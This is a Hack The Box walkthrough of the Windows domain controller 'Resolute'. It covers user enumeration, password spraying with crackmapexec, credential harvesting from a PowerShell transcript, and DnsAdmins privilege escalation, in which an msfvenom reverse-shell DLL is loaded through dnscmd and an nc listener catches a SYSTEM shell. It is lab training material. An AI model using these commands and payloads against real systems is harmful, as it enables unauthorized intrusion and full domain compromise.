---
layout: post
title: Resolute Write-up / Walkthrough - HTB
---

![resolute badge](./resolutebadge.jpg)

Resolute is a Windows machine rated Medium on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.169`

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-26 05:20:00Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This machine appears to be an AD domain controller.

## Enumerating RPC and SMB

Let's use `enum4linux` to gather some initial intel.

`enum4linux 10.10.10.169`

From its output, we find 26 usernames .

```
 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
<SNIP>
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
<SNIP>
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
```

The most juicy bit of information is a password that looks like a default password set upon account creation.

Trying the password with the username `marko` on both SMB and WinRM was not fruitful.

## Password Spraying

With a handful of users and one password, password spraying seems feasible. This is especially true as the password we have seems to be the default password for new accounts. If there are lazy users, we might get a hit.

The first step is to compile a **list of users**.

From our enum4linux output, we have a list of users in the following format:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

We can use the following command to extract the usernames.

`awk -F'[' '{print $2}' namesfromenum.txt | awk -F']' '{print $1}' > users.txt`

Next, let's spray the password `Welcome123!` with `crackmapexec`.

First, let's try spraying SMB.

```
$ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
<SNIP>
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123! 
```

It works for the user `melanie`. Let's try if the credentials work on WinRM as well.

```
$ evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>
```

We find the **user.txt** on melanie's Desktop.

## Finding Credentials In Hidden Files

As part of our enumeration, we searched for hidden files on the machine. 

`*Evil-WinRM* PS C:\> ls -recurse -hidden -erroraction silentlycontinue`

```
<SNIP>
    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
<SNIP>
```

A [powershell transcript](https://mcpmag.com/articles/2015/11/18/use-powershell-transcripts.aspx) stands out.

Reviewing the transcript reveals a set of credentials.

```
*Evil-WinRM* PS C:\> cat C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
<SNIP>
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
<SNIP>
```

Let's try to switch to the account of `ryan` with the newfound credentials.

```
$ evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

We got in!

## Privilege Escalation From DNSAdmins

As part of our enumeration, we uncover that `ryan` is part of the `DnsAdmins` group. 

Some research reveals that it's possible to perform [privilege escalation](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) from this group.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
<SNIP>
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
```

### How Does DnsAdmins Privilege Escalation Work

`DnsAdmins` is a [default AD Security Group](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) that has access to DNS information. This group has **write access** on DNS server objects.

With this write access, we can configure the DNS server to load a server level plugin.

Based on [Microsoft's documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723):

*ServerLevelPluginDll points to a DLL that the DNS server can use to resolve unknown names.*

By pointing `serverlevelplugindll` to a malicious payload of our choice, we can get the DNS server to run it.

And because `dns.exe` runs as SYSTEM, it loads the malicious DLL as SYSTEM, offering us the chance to escalate our privilege.

### How To Exploit DnsAdmin Privilege Escalation

These are the steps:

1. Create a DLL reverse shell payload.
2. Change the DNS server config to point `ServerLevelPluginDLL` to our payload.
3. Prepare a handler.
4. Restart the server to load the DLL.

A critical requirement of this exploitation requires us to restart the DNS service to load the DLL payload. Hence, let's ascertain that our account has the permissions to do so.

```
*Evil-WinRM* PS C:\Users\ryan\music> .\accesschk.exe /accepteula -ucqv dns
dns
  Medium Mandatory Level (Default) [No-Write-Up]
<SNIP>
  R  MEGABANK\ryan
        SERVICE_QUERY_STATUS
        SERVICE_INTERROGATE
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

Yes, the user ryan has the ability to SERVICE_START and SERVICE_STOP.

Now, let's move onto the exploitation.

First, let's use `msfvenom` to create a DLL payload.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=8888 --platform=windows -f dll > plugin.dll`

Next, let's change the DNS server configuration to point to the DLL.

We will infiltrate the DLL with the help of Impacket's `smbserver`. Use the command below in a local folder that contains `plugin.dll`.

`impacket-smbserver SHARE .`

Next, let's use `dnscmd.exe` to alter the configuration. It is a [command line software for managing DNS servers](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd).

```
*Evil-WinRM* PS C:\> dnscmd.exe RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.X.X\share\plugin.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Before we attempt to load `plugin.dll`, let's create a listener for the reverse shell.

`nc -nvlp 8888`

Finally, let's force the DNS server to load the DLL by restarting it with `sc.exe` - a tool for managing services.

```
*Evil-WinRM* PS C:\> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3472
        FLAGS              :
```

After starting the DNS server, we receive a connection on our nc listener.

```
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.169] 59327
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# Thoughts

This box offered good practice for password spraying and basic Windows enumeration. The DnsAdmin escalation vector was new to me and was a great learning exercise.

**DnsAdmins Privilege Escalation**

* https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/
* https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
* https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
